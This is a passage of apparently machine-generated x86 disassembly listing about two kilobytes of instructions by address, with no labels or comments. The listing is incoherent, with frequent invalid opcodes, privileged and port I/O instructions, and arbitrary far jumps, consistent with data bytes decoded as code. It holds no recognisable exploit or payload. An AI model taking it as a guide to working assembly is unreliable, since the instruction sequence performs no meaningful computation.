  695557:	int3   
  695558:	(bad)  
  695559:	push   eax
  69555a:	inc    ecx
  69555b:	fimul  DWORD PTR [esi+0x5f]
  69555e:	adc    BYTE PTR [ebx+edi*4+0x3d],0x10
  695563:	in     al,0x3d
  695565:	ret    0x6d4a
  695568:	xchg   ebp,eax
  695569:	bound  ecx,QWORD PTR [edx]
  69556b:	loopne 0x6954fd
  69556d:	jl     0x695558
  69556f:	(bad)  
  695570:	xlat   BYTE PTR ds:[ebx]
  695571:	pop    ebp
  695572:	clc    
  695573:	stc    
  695574:	xchg   ebx,eax
  695575:	mov    esi,0xe6091d0c
  69557a:	dec    esi
  69557b:	sbb    eax,0x45cdbe40
  695580:	(bad)  
  695581:	cs xor al,0x57
  695584:	shr    DWORD PTR [eax+0x6a],1
  695587:	dec    edi
  695588:	pop    edx
  695589:	test   al,0x62
  69558b:	retf   0x6733
  69558e:	dec    esi
  69558f:	sti    
  695590:	rcl    DWORD PTR [esi+0x62],1
  695593:	adc    bh,BYTE PTR [edi-0x5e95b9b5]
  695599:	pusha  
  69559a:	jle    0x69561b
  69559c:	add    eax,0xfc6d9db7
  6955a1:	(bad)  
  6955a2:	lea    eax,[esi+0x52]
  6955a5:	mov    eax,ds:0x6ef9ff8e
  6955aa:	fwait
  6955ab:	inc    eax
  6955ac:	stos   DWORD PTR es:[edi],eax
  6955ad:	sub    eax,0x294e597
  6955b2:	out    0x5c,eax
  6955b4:	cmp    DWORD PTR [edi+0x7832078f],eax
  6955ba:	test   ch,bh
  6955bc:	and    al,0xfa
  6955be:	arpl   WORD PTR [eax],cx
  6955c0:	cmp    BYTE PTR [eax-0x2a99a4da],bl
  6955c6:	ins    BYTE PTR es:[edi],dx
  6955c7:	add    dh,cl
  6955c9:	pushf  
  6955ca:	int3   
  6955cb:	jge    0x695579
  6955cd:	push   ss
  6955ce:	ins    DWORD PTR es:[edi],dx
  6955cf:	xchg   edx,eax
  6955d0:	inc    esi
  6955d1:	mov    ecx,0xdcaf6a19
  6955d6:	mov    eax,ds:0xc86dc0e4
  6955db:	imul   ebx,DWORD PTR [ebp+0x689e3044],0xffffff84
  6955e2:	sub    eax,DWORD PTR [eax]
  6955e4:	xchg   ebp,eax
  6955e5:	and    al,0x73
  6955e7:	ja     0x695616
  6955e9:	and    ecx,DWORD PTR [ecx+0x1d]
  6955ec:	es xor al,0x70
  6955ef:	fs scas eax,DWORD PTR es:[edi]
  6955f1:	push   edi
  6955f2:	dec    esp
  6955f4:	aaa    
  6955f5:	pop    ds
  6955f6:	jo     0x695622
  6955f8:	or     bl,dh
  6955fa:	(bad)  
  6955fc:	clc    
  6955fd:	pop    ss
  6955fe:	js     0x6955a4
  695600:	ja     0x695597
  695602:	xchg   edx,eax
  695603:	add    al,0x61
  695605:	mov    cl,0x15
  695607:	push   0x285832fc
  69560c:	dec    esi
  69560d:	out    0xc0,eax
  69560f:	sbb    BYTE PTR [edi-0x32],cl
  695612:	fstp   TBYTE PTR es:[edx+0x1e2b66ef]
  695619:	mov    ecx,0xcd368cc8
  69561e:	call   0x4de3:0x23aef17f
  695625:	clc    
  695626:	and    DWORD PTR [esi+0x12b6d436],esi
  69562c:	imul   edi,DWORD PTR ds:0xe60,0x38
  695632:	mov    ds:0x8ef40525,al
  695637:	jne    0x6955ff
  695639:	xchg   esp,eax
  69563a:	bound  ecx,QWORD PTR [edx+0x3c632452]
  695640:	cmp    BYTE PTR [ebx+edx*4],dh
  695643:	xchg   esi,eax
  695644:	enter  0x6bda,0xe1
  695648:	call   0xb2c70b44
  69564d:	xchg   esi,eax
  69564e:	mov    ebx,0x450d48e4
  695653:	push   ebp
  695654:	shl    DWORD PTR [edx],cl
  695656:	adc    edx,edx
  695658:	fidivr DWORD PTR [ecx+0x4e392ff3]
  69565e:	jge    0x6956d5
  695660:	mov    esp,0x2841c09a
  695665:	sub    al,0xe0
  695667:	mov    ds:0xbc0ef3fc,eax
  69566c:	lods   al,BYTE PTR ds:[esi]
  69566d:	arpl   WORD PTR [ebx],di
  69566f:	push   esi
  695670:	push   edi
  695671:	stc    
  695672:	xchg   esi,eax
  695673:	(bad)  
  695674:	pop    edx
  695675:	jp     0x69560b
  695677:	std    
  695678:	out    dx,eax
  695679:	lahf   
  69567a:	or     BYTE PTR [ebx-0x77],0xbb
  69567e:	rcl    edi,0x7b
  695681:	jb     0x695679
  695683:	and    BYTE PTR [edi+0xb],0xd5
  695687:	mov    edi,0x7deb73c8
  69568c:	ins    DWORD PTR es:[edi],dx
  69568d:	fld    DWORD PTR [edx-0x13d15745]
  695693:	push   cs
  695694:	adc    ch,BYTE PTR [ebp-0x8]
  695697:	pop    ds
  695698:	jae    0x695625
  69569a:	aam    0xf8
  69569c:	jle    0x695714
  69569e:	(bad)  
  69569f:	fimul  DWORD PTR [ebx+0x2b174fa1]
  6956a5:	pop    edi
  6956a6:	fwait
  6956a7:	js     0x695681
  6956a9:	xor    DWORD PTR [edi+0x23],edi
  6956ac:	push   eax
  6956ad:	sbb    bl,al
  6956af:	test   al,0xaa
  6956b1:	fs out 0x8b,al
  6956b4:	neg    BYTE PTR [eax+0x4ae07756]
  6956ba:	xchg   ecx,eax
  6956bb:	lahf   
  6956bc:	xchg   esp,eax
  6956bd:	mov    ds:0xd2939517,eax
  6956c2:	xlat   BYTE PTR ds:[ebx]
  6956c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6956c4:	in     al,0xef
  6956c6:	fstp   QWORD PTR [eax-0x36]
  6956c9:	sbb    al,bl
  6956cb:	js     0x695706
  6956cd:	xor    DWORD PTR [edx-0x5a],0xffffffe3
  6956d1:	test   DWORD PTR ds:0xa859aa05,ebp
  6956d7:	ja     0x69565f
  6956d9:	mov    al,ds:0x3273e6c9
  6956de:	jmp    0xb94f66b4
  6956e3:	pop    ebx
  6956e4:	push   eax
  6956e5:	or     DWORD PTR [ecx+0x4910a912],ecx
  6956eb:	icebp  
  6956ec:	or     al,0x55
  6956ee:	lods   eax,DWORD PTR ds:[esi]
  6956ef:	sbb    al,0x3e
  6956f1:	xor    BYTE PTR [edi-0x6e],dl
  6956f4:	push   0x36
  6956f6:	shl    DWORD PTR [ecx+eax*8+0x2f06c2b8],cl
  6956fd:	push   ecx
  6956fe:	and    ch,ch
  695700:	pop    edi
  695701:	add    al,0x4d
  695703:	xchg   edx,eax
  695704:	cwde   
  695705:	and    edi,DWORD PTR [eax-0x2e]
  695708:	sbb    ch,BYTE PTR [eax]
  69570a:	jg     0x69572e
  69570c:	mov    ss,eax
  69570e:	loope  0x695755
  695710:	fs and eax,0xec288aef
  695717:	jmp    0x699ff064
  69571c:	pop    edx
  69571d:	fmul   QWORD PTR [edx+0x58]
  695720:	aam    0x86
  695722:	sbb    ecx,DWORD PTR [esi+ecx*4]
  695725:	adc    al,0xf5
  695727:	dec    esp
  695728:	mov    DWORD PTR ds:0x3f856d97,edx
  69572e:	mov    esi,DWORD PTR cs:[ecx+0x42dfae51]
  695735:	and    eax,0x76068b9d
  69573a:	int3   
  69573b:	pushf  
  69573c:	inc    esi
  69573e:	push   ss
  69573f:	push   0x30
  695741:	test   BYTE PTR [eax-0x50306a44],al
  695747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  695748:	sbb    BYTE PTR [esp+edi*1-0x74],dh
  69574c:	(bad)  
  69574d:	jecxz  0x69570b
  69574f:	mov    ah,bl
  695751:	stos   DWORD PTR es:[edi],eax
  695752:	fld    DWORD PTR [esi]
  695754:	push   esp
  695755:	lds    ebp,FWORD PTR [edx-0x1]
  695758:	ficomp WORD PTR [ecx-0x5d]
  69575b:	mov    BYTE PTR [ecx+eiz*8-0x6c14c674],bl
  695762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  695763:	mov    eax,0x15dbd05
  695768:	call   0xc3f4:0x710d012f
  69576f:	retf   0x8045
  695772:	jmp    0x6e6:0xe6a81db
  695779:	(bad)  
  69577a:	hlt    
  69577b:	call   0x443035b4
  695780:	mov    ah,BYTE PTR [ebp+0xf]
  695783:	fcmovnb st,st(4)
  695785:	jl     0x6957f4
  695787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  695788:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  695789:	aad    0xb7
  69578b:	mov    WORD PTR [edi+ecx*2-0x557a1f31],cs
  695792:	or     eax,0x9a9cedb3
  695797:	mov    ecx,0xf81cf8a4
  69579c:	xor    al,0xb2
  69579e:	jns    0x695793
  6957a0:	inc    edi
  6957a1:	jge    0x69575c
  6957a3:	arpl   WORD PTR [edx],ax
  6957a5:	xchg   ch,bl
  6957a7:	into   
  6957a8:	adc    ecx,0xffffffda
  6957ab:	loope  0x69577c
  6957ad:	mov    ebx,0x9c1f0fb4
  6957b2:	imul   eax,DWORD PTR [eax-0xeb8ff3a],0xffffff93
  6957b9:	inc    edx
  6957ba:	repz pop edi
  6957bc:	repnz xor ebp,DWORD PTR [ecx]
  6957bf:	mov    ah,0x9e
  6957c1:	(bad)  
  6957c3:	jmp    0xdeec:0x93137d9c
  6957ca:	popa   
  6957cb:	aas    
  6957cc:	outs   dx,DWORD PTR ds:[esi]
  6957cd:	ret    0x60f1
  6957d0:	sbb    BYTE PTR [ebp+0x21],ah
  6957d3:	push   cs
  6957d4:	call   0xacea:0xb7ee4f18
  6957db:	ins    DWORD PTR es:[edi],dx
  6957dc:	shl    BYTE PTR ds:0x10e4e7a4,0x33
  6957e3:	leave  
  6957e4:	pop    ss
  6957e5:	es (bad) 
  6957e7:	into   
  6957e8:	mov    ds:0x6ebec5ff,eax
  6957ed:	les    ecx,FWORD PTR [ecx-0x305daa42]
  6957f3:	dec    edi
  6957f4:	ret    
  6957f5:	repnz test BYTE PTR [ebx+ecx*8],al
  6957f9:	aaa    
  6957fa:	push   es
  6957fb:	out    dx,al
  6957fc:	xchg   ebp,eax
  6957fd:	cmp    dh,dh
  6957ff:	cmp    edi,DWORD PTR [ebx]
  695801:	xor    eax,0xff6d76a6
  695806:	mov    ah,0xac
  695808:	mov    bh,0x56
  69580a:	rol    DWORD PTR [edi+0x3119af18],0x59
  695811:	jbe    0x69579e
  695813:	data16 out 0x88,al
  695816:	mov    cl,0xe9
  695818:	jle    0x6957e5
  69581a:	sub    al,0xfd
  69581c:	push   ds
  69581d:	call   0x32af:0xaef7ea3f
  695824:	add    cl,BYTE PTR [ebx]
  695826:	inc    eax
  695827:	ret    0xdaa7
  69582a:	dec    esp
  69582b:	sbb    eax,0xd83d556c
  695830:	mov    esp,0x110f9b11
  695835:	inc    esi
  695836:	ds mov ch,0x56
  695839:	or     cl,al
  69583b:	xchg   edx,eax
  69583c:	pop    edx
  69583d:	jg     0x695876
  69583f:	dec    ecx
  695840:	xchg   edi,eax
  695841:	or     edx,DWORD PTR [ebp+0x34b82e2]
  695847:	mov    bh,0x98
  695849:	dec    esp
  69584a:	icebp  
  69584b:	js     0x695864
  69584d:	cli    
  69584e:	icebp  
  69584f:	and    edx,DWORD PTR [edx+0x2b]
  695852:	or     dh,cl
  695854:	stos   DWORD PTR es:[edi],eax
  695855:	and    edx,0xfffffffd
  695858:	pop    ss
  695859:	int3   
  69585a:	(bad)  
  69585b:	jne    0x695851
  69585d:	push   eax
  69585e:	lods   eax,DWORD PTR ds:[esi]
  69585f:	push   0x3a
  695861:	mov    cl,0x34
  695863:	je     0x695806
  695865:	mov    cs,WORD PTR [eax+0x54]
  695868:	popa   
  695869:	mov    dh,0x4f
  69586b:	push   edx
  69586c:	stos   DWORD PTR es:[edi],eax
  69586d:	adc    esi,ebp
  69586f:	imul   ebp,DWORD PTR [ebx-0x12],0x406a8f5d
  695876:	mov    ds:0x6a1102ab,al
  69587b:	inc    edx
  69587c:	(bad)  
  69587d:	pop    edi
  69587e:	jp     0x6958a3
  695880:	ins    BYTE PTR es:[edi],dx
  695881:	into   
  695882:	jbe    0x6958f4
  695884:	mov    edi,0x3c29aa03
  695889:	or     eax,0xdcba7756
  69588e:	fiadd  DWORD PTR [esi+0x6ca36d4c]
  695894:	cmp    al,BYTE PTR [eax+0xb]
  695897:	repz gs aam 0x2a
  69589b:	arpl   WORD PTR [ebp-0x1e050a20],si
  6958a1:	inc    eax
  6958a2:	mov    ebp,0x1b43d0
  6958a7:	inc    esp
  6958a8:	jecxz  0x695832
  6958aa:	adc    esi,edi
  6958ac:	ja     0x6958bc
  6958ae:	mov    esi,0xf38d1bb7
  6958b3:	repnz test eax,0x100cf4ef
  6958b9:	lds    ebp,FWORD PTR [eax-0x3d]
  6958bc:	sbb    edx,DWORD PTR [edx-0x3ff8f48a]
  6958c2:	adc    eax,DWORD PTR [ebx+esi*1]
  6958c5:	in     al,0xf7
  6958c7:	push   ebx
  6958c8:	lahf   
  6958c9:	(bad)  
  6958cb:	jns    0x695924
  6958cd:	fidivr DWORD PTR [ebx+0x6d3ffba0]
  6958d3:	cmp    al,BYTE PTR [esi+0x2e]
  6958d6:	fstp   DWORD PTR [edx]
  6958d8:	sub    DWORD PTR es:[esi],esp
  6958db:	or     BYTE PTR [edx+0x34],bl
  6958de:	(bad)  
  6958df:	fimul  DWORD PTR [esp+ebp*1+0xd3d41e2]
  6958e6:	pop    es
  6958e7:	mov    edx,DWORD PTR [esi-0xbf80113]
  6958ed:	in     eax,0x4b
  6958ef:	mov    cl,0x2f
  6958f1:	push   0x4dfa475e
  6958f6:	xchg   esi,eax
  6958f7:	sbb    al,0x7a
  6958f9:	psubq  mm3,QWORD PTR ds:0x580786fb
  695900:	pop    edx
  695901:	push   esp
  695902:	aaa    
  695903:	sub    BYTE PTR [esi+0x1f6898e],bl
  695909:	mov    cl,0x42
  69590b:	and    eax,ebx
  69590d:	push   edi
  69590e:	jns    0x695954
  695910:	sbb    dl,BYTE PTR [eax]
  695912:	push   0x13
  695914:	sub    al,0x61
  695916:	icebp  
  695917:	push   esp
  695918:	cmp    eax,0xeb66e2b8
  69591d:	sbb    bl,0x8d
  695920:	xchg   esp,eax
  695921:	add    eax,0x9c07279d
  695926:	je     0x69597f
  695928:	jo     0x695904
  69592a:	jnp    0x69592e
  69592c:	dec    ebx
  69592d:	and    BYTE PTR [edi-0xdf7a30],0x89
  695934:	push   esp
  695935:	adc    eax,DWORD PTR [edi+0x65618ab3]
  69593b:	jg     0x6959b7
  69593d:	in     al,dx
  69593e:	dec    ecx
  69593f:	lahf   
  695940:	fisubr WORD PTR [ebx]
  695942:	cmp    esp,DWORD PTR [edi]
  695944:	xchg   eax,ebx
  695946:	sbb    BYTE PTR [edi],ah
  695948:	repz addr16 popf 
  69594b:	dec    esp
  69594c:	mov    ecx,0x4a097ab6
  695951:	add    cl,bl
  695953:	xchg   esi,eax
  695954:	lea    ebp,[edx-0x5f9baa0a]
  69595a:	mov    ah,0x6a
  69595c:	aas    
  69595d:	arpl   WORD PTR [edx+0x216a7a9],di
  695963:	push   edi
  695964:	push   0xfffffff6
  695966:	into   
  695967:	dec    ebp
  695968:	inc    esp
  695969:	fwait
  69596a:	xor    DWORD PTR [edx-0x66],esi
  69596d:	and    DWORD PTR [edx-0x48],ebp
  695970:	dec    esi
  695971:	cmp    DWORD PTR [eax-0x1b],esp
  695974:	xchg   ebp,eax
  695975:	xor    ecx,DWORD PTR [ebx+0x1718b87d]
  69597b:	dec    edx
  69597c:	loope  0x6959c6
  69597e:	jno    0x695995
  695980:	add    al,0x3c
  695982:	les    esi,FWORD PTR ds:0x7b6e7ad2
  695988:	lods   eax,DWORD PTR ds:[esi]
  695989:	sub    eax,DWORD PTR [eax+0x5b]
  69598c:	push   eax
  69598d:	jb     0x6959c3
  69598f:	add    al,0xc
  695991:	test   eax,0x954c1dbb
  695996:	out    dx,al
  695997:	addr16 pop eax
  695999:	sub    DWORD PTR [eax-0x62b51a92],ebx
  69599f:	js     0x695980
  6959a1:	popf   
  6959a2:	sti    
  6959a3:	inc    ecx
  6959a4:	imul   edx,DWORD PTR [ebx+0x55],0x3d69b894
  6959ab:	(bad)  
  6959ad:	jecxz  0x6959b5
  6959af:	nop
  6959b0:	jne    0x6959c1
  6959b2:	ret    0xe363
  6959b5:	addr16 push edx
  6959b7:	std    
  6959b8:	pop    ds
  6959b9:	xchg   BYTE PTR ds:0x7c39b565,ch
  6959bf:	pushf  
  6959c0:	loopne 0x6959dd
  6959c2:	int3   
  6959c3:	or     eax,DWORD PTR [edx-0x19]
  6959c6:	je     0x6959ef
  6959c8:	or     ah,BYTE PTR [eax+eax*4-0x1d]
  6959cc:	stos   BYTE PTR es:[edi],al
  6959cd:	cwde   
  6959ce:	pushf  
  6959cf:	jae    0x695969
  6959d1:	xchg   DWORD PTR [edx],eax
  6959d3:	dec    esp
  6959d4:	sub    dl,BYTE PTR [ebp-0x50]
  6959d7:	pop    ebx
  6959d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6959d9:	jmp    0x695a31
  6959db:	push   0xffffffd4
  6959dd:	or     al,0x2a
  6959df:	in     eax,0xb9
  6959e1:	add    esp,DWORD PTR [ebx+0x4f827328]
  6959e7:	pop    es
  6959e8:	fwait
  6959e9:	add    al,0x8a
  6959eb:	pop    edx
  6959ec:	ss xor al,0xe9
  6959ef:	test   bh,dl
  6959f1:	jno    0x6959a4
  6959f3:	rol    BYTE PTR [eax-0x6f6a2d99],cl
  6959f9:	push   es
  6959fa:	push   ds
  6959fb:	(bad)  
  6959fc:	sar    DWORD PTR [edx-0x29],1
  6959ff:	mov    edi,0x71946696
  695a04:	sub    eax,0x3c7c57dd
  695a09:	lea    edx,[edx+0x55]
  695a0c:	jle    0x695a4f
  695a0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  695a0f:	(bad)  
  695a10:	sub    eax,0xf1752917
  695a15:	xchg   esp,eax
  695a16:	(bad)  
  695a17:	cmp    al,BYTE PTR [esi+ecx*1+0x71]
  695a1b:	jmp    0xca677062
  695a20:	int    0xed
  695a22:	mov    ds:0xf6eb490b,al
  695a27:	stos   DWORD PTR es:[edi],eax
  695a28:	(bad)
  695a2b:	sub    bl,BYTE PTR [edi-0x7c]
  695a2e:	mov    edx,DWORD PTR [eax]
  695a30:	je     0x695a47
  695a32:	(bad)  
  695a34:	les    esi,FWORD PTR [edi-0x78]
  695a37:	or     ecx,edi
  695a39:	jg     0x695a43
  695a3b:	(bad)  
  695a3d:	xchg   ebp,eax
  695a3e:	jne    0x695a87
  695a40:	inc    esi
  695a41:	(bad)  
  695a43:	fmul   st,st(2)
  695a45:	lock clc 
  695a47:	push   ecx
  695a48:	push   ss
  695a49:	mov    eax,0x36e5302
  695a4e:	mov    esi,0x3d143b84
  695a53:	sbb    al,BYTE PTR [esi+eiz*2+0x2be049ca]
  695a5a:	(bad)  
  695a5b:	repnz inc edx
  695a5d:	imul   edx,DWORD PTR [edi],0xffffffc6
  695a60:	(bad)  
  695a61:	adc    dl,BYTE PTR [eax]
  695a63:	mov    esi,0x16e124fe
  695a68:	inc    edx
  695a69:	xlat   BYTE PTR ds:[ebx]
  695a6a:	inc    edx
  695a6b:	xchg   ecx,eax
  695a6c:	and    al,0x4c
  695a6e:	out    0xe7,eax
  695a70:	shl    DWORD PTR [edi+0x12],1
  695a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  695a74:	mov    DWORD PTR [eax-0x65121986],edx
  695a7a:	rcl    DWORD PTR [edx],1
  695a7c:	cmp    al,0xc
  695a7e:	mov    dl,0x7b
  695a80:	add    DWORD PTR [ebp+0x3c],esp
  695a83:	add    dh,0x8c
  695a86:	inc    ebx
  695a87:	inc    esp
  695a88:	push   0x30feeffa
  695a8d:	xchg   ebp,eax
  695a8e:	and    DWORD PTR [ebx*1+0x1d3e198e],0x7f7b779
  695a99:	pushf  
  695a9a:	retf   0x7629
  695a9d:	call   0x695f168c
  695aa2:	xor    al,0xdd
  695aa4:	ficomp WORD PTR [edi-0x55]
  695aa7:	xor    eax,0xc80d996e
  695aac:	sbb    eax,0xc13583eb
  695ab1:	add    cl,BYTE PTR [eax]
  695ab3:	and    dh,ah
  695ab5:	xchg   ebx,eax
  695ab6:	add    DWORD PTR [eax-0x7c357eae],ebx
  695abc:	(bad)  
  695abd:	in     al,0xc5
  695abf:	and    edi,DWORD PTR [edx+0x3bc03939]
  695ac5:	jmp    0x695abd
  695ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  695ac8:	inc    edi
  695ac9:	call   0xa048:0xd4b764e2
  695ad0:	retf   
  695ad1:	or     al,BYTE PTR [ebp-0x4312dc09]
  695ad7:	mov    dl,0xb3
  695ad9:	adc    ebp,ebx
  695adb:	into   
  695adc:	ins    BYTE PTR es:[edi],dx
  695add:	jle    0x695a87
  695adf:	sub    ebp,eax
  695ae1:	inc    edi
  695ae2:	retf   
  695ae3:	sub    ebp,0x9208c6d
  695ae9:	(bad)  
  695aea:	jg     0x695abb
  695aec:	daa    
  695aed:	imul   edx,DWORD PTR [edx],0xffffffe9
  695af0:	repz bound ebx,QWORD PTR [esi-0x6c4b55cf]
  695af7:	out    dx,al
  695af8:	add    BYTE PTR [ebx-0x4d],dl
  695afb:	mov    edi,0xd857369f
  695b00:	pop    esp
  695b01:	cli    
  695b02:	xor    bl,BYTE PTR ds:0x34cbfa93
  695b08:	(bad)  [edx-0x497a8c11]
  695b0e:	rol    DWORD PTR [edx+0x28],0x18
  695b12:	std    
  695b13:	(bad)  
  695b14:	out    dx,eax
  695b15:	or     al,0x67
  695b17:	sbb    eax,0x3875f623
  695b1c:	jbe    0x695ad8
  695b1e:	mov    ds:0x47e64d25,al
  695b23:	(bad)  
  695b24:	xchg   esp,eax
  695b25:	pop    edx
  695b26:	ret    
  695b27:	and    al,0x1b
  695b29:	xor    dh,al
  695b2b:	jg     0x695ac9
  695b2d:	hlt    
  695b2e:	sub    ebp,ecx
  695b30:	mul    bl
  695b32:	fimul  DWORD PTR [ecx]
  695b34:	add    eax,0x78971023
  695b39:	shr    BYTE PTR [ebx],0xa0
  695b3c:	pop    ds
  695b3d:	adc    edx,edx
  695b3f:	fstp   QWORD PTR [eax+0x4c]
  695b42:	cmp    BYTE PTR [esp+edx*4],dl
  695b45:	test   eax,0x77cdfa0d
  695b4a:	mov    BYTE PTR [edi-0x7],ch
  695b4d:	cmp    al,0xfd
  695b4f:	dec    esi
  695b50:	dec    esp
  695b51:	add    eax,0x1b1c6082
  695b56:	xchg   ecx,eax
  695b57:	fidivr WORD PTR [ecx]
  695b59:	sbb    dl,cl
  695b5b:	aas    
  695b5c:	add    eax,DWORD PTR [ebx]
  695b5e:	iret   
  695b5f:	mov    eax,ds:0x378dbe30
  695b64:	dec    edi
  695b65:	jl     0x695b72
  695b67:	add    edi,DWORD PTR [esi+eax*8+0x4ea32acc]
  695b6e:	xchg   ebp,eax
  695b6f:	pop    ebp
  695b70:	(bad)  
  695b71:	stos   BYTE PTR es:[edi],al
  695b72:	imul   ecx,DWORD PTR [ebx-0x39],0x2fa234de
  695b79:	xor    cl,BYTE PTR ds:0x698385e9
  695b7f:	jg     0x695b56
  695b81:	push   ecx
  695b82:	daa    
  695b83:	sbb    BYTE PTR [eax-0x30eb5812],dh
  695b89:	loope  0x695ba7
  695b8b:	dec    edx
  695b8c:	iret   
  695b8d:	bound  edx,QWORD PTR ds:0x2dbeebd0
  695b93:	jns    0x695b7b
  695b95:	aas    
  695b96:	ret    0x8490
  695b99:	push   ebx
  695b9a:	fadd   QWORD PTR [ebx]
  695b9c:	sbb    al,0x28
  695b9e:	test   eax,0xa86f415e
  695ba3:	jecxz  0x695be1
  695ba5:	jbe    0x695b49
  695ba7:	sub    al,0x47
  695ba9:	loopne 0x695bd3
  695bab:	js     0x695bc3
  695bad:	dec    eax
  695bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  695baf:	sbb    edx,DWORD PTR [edi]
  695bb1:	push   ebp
  695bb2:	jne    0x695c0e
  695bb4:	add    BYTE PTR [edi-0x6f],dh
  695bb7:	inc    ebp
  695bb8:	sbb    eax,0x1a379ab1
  695bbd:	arpl   si,sp
  695bbf:	and    al,0xfe
  695bc1:	inc    esp
  695bc2:	ss out dx,al
  695bc4:	or     ecx,DWORD PTR [esi]
  695bc6:	lock push ebp
  695bc8:	jnp    0x695b9e
  695bca:	sub    BYTE PTR [ecx-0x7453ab3],dl
  695bd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  695bd1:	sbb    DWORD PTR [eax],eax
  695bd3:	mov    esi,0x91f5826d
  695bd8:	sub    BYTE PTR [esi+0x74a51cd7],bl
  695bde:	ret    0xa6f9
  695be1:	jmp    0xcef2be36
  695be6:	jle    0x695c2e
  695be8:	sbb    ecx,edx
  695bea:	pop    edi
  695beb:	xlat   BYTE PTR ds:[ebx]
  695bec:	iret   
  695bed:	add    al,0x38
  695bef:	pop    ss
  695bf0:	lahf   
  695bf1:	jb     0x695bb4
  695bf3:	(bad)  
  695bf4:	test   eax,0xedfc7a33
  695bf9:	sti    
  695bfa:	mov    edx,0xa2bcc307
  695bff:	test   DWORD PTR [edx+0x6dffaca0],esp
  695c05:	or     DWORD PTR [ecx+0x361b7bf3],ecx
  695c0b:	sub    al,0xe3
  695c0d:	aaa    
  695c0e:	sub    BYTE PTR [ebx-0x71],cl
  695c11:	cmp    bl,BYTE PTR [ebx-0x40]
  695c14:	adc    DWORD PTR [ecx],ebp
  695c16:	outs   dx,DWORD PTR ds:[esi]
  695c17:	push   ecx
  695c18:	xchg   BYTE PTR [esi+0x6af24bd],al
  695c1e:	lods   al,BYTE PTR ds:[esi]
  695c1f:	sbb    al,0xe7
  695c21:	clc    
  695c22:	cmp    cl,bh
  695c24:	les    esi,FWORD PTR [ecx-0x80]
  695c27:	fwait
  695c28:	popa   
  695c29:	xchg   edx,eax
  695c2a:	dec    eax
  695c2b:	scas   al,BYTE PTR es:[edi]
  695c2c:	and    al,0x97
  695c2e:	aaa    
  695c2f:	dec    BYTE PTR [edx-0x1f80b7d9]
  695c35:	outs   dx,DWORD PTR ds:[esi]
  695c36:	jno    0x695c78
  695c38:	push   ecx
  695c39:	retf   
  695c3a:	add    al,BYTE PTR [eax]
  695c3c:	adc    DWORD PTR [edi],ebx
  695c3e:	outs   dx,DWORD PTR ds:[esi]
  695c3f:	jmp    0x140f:0x41bb5204
  695c46:	xlat   BYTE PTR ds:[ebx]
  695c47:	inc    esi
  695c48:	dec    ebx
  695c49:	jbe    0x695c37
  695c4b:	fdivr  st,st(0)
  695c4d:	add    edx,ebp
  695c4f:	or     cl,ch
  695c51:	sbb    DWORD PTR [ecx-0x32e774c0],esp
  695c57:	fimul  WORD PTR [ecx+0x4f6f1512]
  695c5d:	es xor eax,0xb1ea1b40
  695c63:	adc    DWORD PTR [ecx-0x16],edx
  695c66:	inc    edx
  695c67:	int    0x81
  695c69:	or     al,0xda
  695c6b:	inc    edi
  695c6c:	sar    DWORD PTR [esi+0x3a99e112],1
  695c72:	lea    ebp,ds:[edx-0x64ff2964]
  695c79:	(bad)  
  695c7a:	in     eax,dx
  695c7b:	mov    dl,0x3d
  695c7d:	xchg   DWORD PTR [ebp+0x4c010a67],edx
  695c83:	add    ch,BYTE PTR [ebx-0xc03322f]
  695c89:	inc    edi
  695c8a:	jge    0x695c88
  695c8c:	enter  0x48c0,0xa6
  695c90:	jg     0x695c79
  695c92:	mov    dh,0x25
  695c94:	jp     0x695c74
  695c96:	dec    ecx
  695c97:	xchg   bl,ah
  695c99:	pushf  
  695c9a:	sub    al,0xe6
  695c9c:	pmaddwd mm4,QWORD PTR [edi]
  695c9f:	loopne 0x695c9c
  695ca1:	test   BYTE PTR [ebx+ebx*8],bh
  695ca4:	ins    BYTE PTR es:[edi],dx
  695ca5:	pusha  
  695ca6:	call   0x229d:0x8e18a041
  695cad:	addr16 stc 
  695caf:	jmp    0xac51e794
  695cb4:	out    dx,al
  695cb5:	in     al,dx
  695cb6:	mov    ebp,0xaba36bf0
  695cbb:	jae    0x695ce0
  695cbd:	ins    DWORD PTR es:[edi],dx
  695cbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  695cbf:	(bad)  [edi]
  695cc1:	(bad)  [eax+0x34]
  695cc4:	sub    DWORD PTR [edx+eiz*8],0x7f9e7a21
  695ccb:	imul   edx,DWORD PTR [esi+0x41871872],0xffffffce
  695cd2:	mov    cs:0x4e940f1d,eax
  695cd8:	shl    WORD PTR [eax],1
  695cdb:	in     eax,0xc2
  695cdd:	pop    eax
  695cde:	xor    ebp,DWORD PTR [edx-0x2d84f579]
  695ce4:	jle    0x695c9c
  695ce6:	pop    esi
  695ce7:	fwait
  695ce8:	cmp    DWORD PTR [edi+0x3b3d3879],ebx
  695cee:	mov    al,ds:0x48789603
  695cf3:	sub    eax,0x782279d4
  695cf8:	dec    edx
  695cf9:	outs   dx,DWORD PTR ds:[esi]
  695cfa:	push   ebx
  695cfb:	xchg   DWORD PTR [ecx-0x19],edx
  695cfe:	loop   0x695d5c
  695d00:	loope  0x695cb5
  695d02:	adc    ch,0xdd
  695d05:	ja     0x695d6a
  695d07:	dec    esi
  695d08:	jmp    0xbc4a:0x78d60412
  695d0f:	mov    ecx,0xd971a1b0
  695d14:	sub    al,0xfa
  695d16:	outs   dx,BYTE PTR ds:[esi]
  695d17:	outs   dx,DWORD PTR ds:[esi]
  695d18:	inc    esp
  695d19:	repnz lds edx,FWORD PTR ds:0xbcd901a8
  695d20:	in     al,0xd2
  695d22:	push   edi
  695d23:	jecxz  0x695ccb
  695d25:	push   edi
  695d26:	wrmsr  
  695d28:	push   esi
  695d29:	mov    bl,0xa8
  695d2b:	cdq    
  695d2c:	test   eax,0x4c395e33
  695d31:	push   esi
  695d32:	rcl    BYTE PTR [edi+0x10d1049a],1
